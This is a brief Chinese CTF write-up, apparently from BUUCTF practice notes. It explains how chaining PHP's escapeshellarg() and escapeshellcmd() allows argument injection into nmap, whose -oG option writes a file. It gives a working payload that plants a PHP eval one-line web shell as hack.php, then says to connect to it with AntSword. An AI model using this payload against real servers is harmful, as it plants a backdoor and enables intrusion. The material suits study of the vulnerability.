考察知识点：

1.nmap -oG参数具有写文件操作

2.PHP escapeshellarg()+escapeshellcmd() 之殇

两个函数搭配会使原来的转义效果，消失

https://paper.seebug.org/164/



1. 构造一句话木马访问即可

```javascript
?host=<?php @eval($_POST["hack"]);?> -oG hack.php
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/601B5E1515B64282882D8C149F5F029Bclipboard.png)



2.蚁剑访问即可

